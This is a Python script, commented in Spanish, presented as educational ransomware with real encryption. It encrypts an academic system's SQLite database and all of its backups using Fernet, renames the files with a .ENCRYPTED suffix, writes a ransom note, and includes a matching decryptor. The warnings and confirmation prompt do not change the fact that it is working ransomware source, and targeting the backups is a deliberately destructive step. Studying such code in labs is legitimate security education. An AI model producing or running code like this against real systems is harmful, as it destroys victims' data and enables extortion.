#!/usr/bin/env python3
"""
RANSOMWARE CON CIFRADO REAL - Solo para propósitos educativos
ADVERTENCIA: Este código cifra archivos realmente. Usar solo en laboratorio.
"""

import os
import sys
from cryptography.fernet import Fernet
from datetime import datetime
import json

class RansomwareEducativo:
    def __init__(self, ruta_objetivo):
        self.ruta_objetivo = ruta_objetivo
        self.clave = None
        self.archivos_cifrados = []
        self.log_file = 'ataque_log.json'
        
    def generar_clave(self):
        """Genera una clave de cifrado Fernet (AES-128)"""
        self.clave = Fernet.generate_key()
        print(f"[+] Clave de cifrado generada")
        
        # Guardar clave (en ransomware real, esto se envía al atacante)
        clave_path = os.path.join(self.ruta_objetivo, '.encryption_key.secret')
        with open(clave_path, 'wb') as f:
            f.write(self.clave)
        print(f"[+] Clave guardada en: {clave_path}")
        
    def cifrar_archivo(self, archivo_path):
        """Cifra un archivo individual usando Fernet"""
        try:
            # Leer contenido original
            with open(archivo_path, 'rb') as f:
                datos = f.read()
            
            # Cifrar
            fernet = Fernet(self.clave)
            datos_cifrados = fernet.encrypt(datos)
            
            # Sobrescribir con datos cifrados
            with open(archivo_path, 'wb') as f:
                f.write(datos_cifrados)
            
            # Renombrar archivo
            nuevo_nombre = archivo_path + '.ENCRYPTED'
            os.rename(archivo_path, nuevo_nombre)
            
            self.archivos_cifrados.append(nuevo_nombre)
            print(f"  ✓ Cifrado: {os.path.basename(nuevo_nombre)}")
            return True
            
        except Exception as e:
            print(f"  ✗ Error cifrando {archivo_path}: {e}")
            return False
    
    def cifrar_base_datos(self):
        """Cifra la base de datos SQLite"""
        print("\n[*] Cifrando base de datos...")
        
        db_path = os.path.join(self.ruta_objetivo, 'sistema_academico.db')
        
        if os.path.exists(db_path):
            return self.cifrar_archivo(db_path)
        else:
            print(f"  ✗ Base de datos no encontrada")
            return False
    
    def cifrar_backups(self):
        """Cifra todos los archivos de backup"""
        print("\n[*] Cifrando backups...")
        
        backup_dir = os.path.join(self.ruta_objetivo, 'backups')
        
        if not os.path.exists(backup_dir):
            print(f"  ⚠ Carpeta de backups no encontrada")
            return False
        
        count = 0
        for archivo in os.listdir(backup_dir):
            archivo_path = os.path.join(backup_dir, archivo)
            if os.path.isfile(archivo_path):
                if self.cifrar_archivo(archivo_path):
                    count += 1
        
        print(f"  ✓ {count} backups cifrados")
        return count > 0
    
    def crear_nota_rescate(self):
        """Crea la nota de rescate con información del cifrado"""
        nota = f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    🔒 SUS ARCHIVOS HAN SIDO CIFRADOS CON AES-128 🔒         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

ATENCIÓN: Este es un cifrado REAL usando criptografía Fernet (AES-128).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 ARCHIVOS CIFRADOS: {len(self.archivos_cifrados)}

{chr(10).join(f'  • {os.path.basename(f)}' for f in self.archivos_cifrados[:10])}
{f'  ... y {len(self.archivos_cifrados) - 10} más' if len(self.archivos_cifrados) > 10 else ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 INFORMACIÓN TÉCNICA:

  Algoritmo: Fernet (AES-128 en modo CBC)
  Clave: {self.clave.decode()[:50]}...
  Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  ID: ACUTIS-CRYPTO-{datetime.now().strftime('%Y%m%d%H%M%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        nota_path = os.path.join(self.ruta_objetivo, 'LEEME_URGENTE.txt')
        with open(nota_path, 'w', encoding='utf-8') as f:
            f.write(nota)
        
        print(f"\n[+] Nota de rescate creada: {nota_path}")
    
    def guardar_log(self):
        """Guarda un log del ataque en formato JSON"""
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'ruta_objetivo': self.ruta_objetivo,
            'archivos_cifrados': self.archivos_cifrados,
            'total_archivos': len(self.archivos_cifrados),
            'clave': self.clave.decode()
        }
        
        log_path = os.path.join(self.ruta_objetivo, self.log_file)
        with open(log_path, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print(f"[+] Log guardado: {log_path}")
    
    def ejecutar_ataque(self):
        """Ejecuta el ataque completo"""
        print("="*60)
        print("🔒 RANSOMWARE EDUCATIVO CON CIFRADO REAL")
        print("="*60)
        print(f"Objetivo: {self.ruta_objetivo}")
        print(f"Fecha: {datetime.now()}\n")
        
        # Paso 1: Generar clave
        self.generar_clave()
        
        # Paso 2: Cifrar base de datos
        self.cifrar_base_datos()
        
        # Paso 3: Cifrar backups
        self.cifrar_backups()
        
        # Paso 4: Crear nota de rescate
        self.crear_nota_rescate()
        
        # Paso 5: Guardar log
        self.guardar_log()
        
        # Resumen
        print("\n" + "="*60)
        print("ATAQUE COMPLETADO")
        print("="*60)
        print(f"Total de archivos cifrados: {len(self.archivos_cifrados)}")
        print(f"Clave de descifrado: .encryption_key.secret")
        print("="*60)


class Descifrador:
    """Clase para descifrar los archivos (solo para laboratorio)"""
    
    @staticmethod
    def descifrar_todo(ruta_objetivo):
        """Descifra todos los archivos cifrados"""
        print("\n🔓 INICIANDO DESCIFRADO...")
        
        # Leer la clave
        clave_path = os.path.join(ruta_objetivo, '.encryption_key.secret')
        
        if not os.path.exists(clave_path):
            print("✗ No se encontró el archivo de clave")
            return False
        
        with open(clave_path, 'rb') as f:
            clave = f.read()
        
        fernet = Fernet(clave)
        print(f"✓ Clave cargada")
        
        # Buscar archivos .ENCRYPTED
        archivos_descifrados = 0
        
        for root, dirs, files in os.walk(ruta_objetivo):
            for archivo in files:
                if archivo.endswith('.ENCRYPTED'):
                    archivo_path = os.path.join(root, archivo)
                    
                    try:
                        # Leer datos cifrados
                        with open(archivo_path, 'rb') as f:
                            datos_cifrados = f.read()
                        
                        # Descifrar
                        datos = fernet.decrypt(datos_cifrados)
                        
                        # Escribir datos originales
                        archivo_original = archivo_path.replace('.ENCRYPTED', '')
                        with open(archivo_original, 'wb') as f:
                            f.write(datos)
                        
                        # Eliminar archivo cifrado
                        os.remove(archivo_path)
                        
                        print(f"  ✓ Descifrado: {os.path.basename(archivo_original)}")
                        archivos_descifrados += 1
                        
                    except Exception as e:
                        print(f"  ✗ Error descifrand: {e}")
        
        print(f"\n✓ {archivos_descifrados} archivos descifrados exitosamente")
        return True


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 ransomware_crypto.py <ruta_sistema_academico>")
        print("Ejemplo: python3 ransomware_crypto.py ~/sistema_academico")
        sys.exit(1)
    
    ruta = os.path.expanduser(sys.argv[1])
    
    if not os.path.exists(ruta):
        print(f"✗ La ruta no existe: {ruta}")
        sys.exit(1)
    
    # Preguntar confirmación (porque cifra de verdad)
    print("⚠️  ADVERTENCIA: Este script cifrará archivos realmente.")
    print("   Solo usar en entorno de laboratorio controlado.")
    respuesta = input("\n¿Continuar? (escriba SI): ")
    
    if respuesta.upper() != "SI":
        print("Ataque cancelado")
        sys.exit(0)
    
    # Ejecutar ataque
    ransomware = RansomwareEducativo(ruta)
    ransomware.ejecutar_ataque()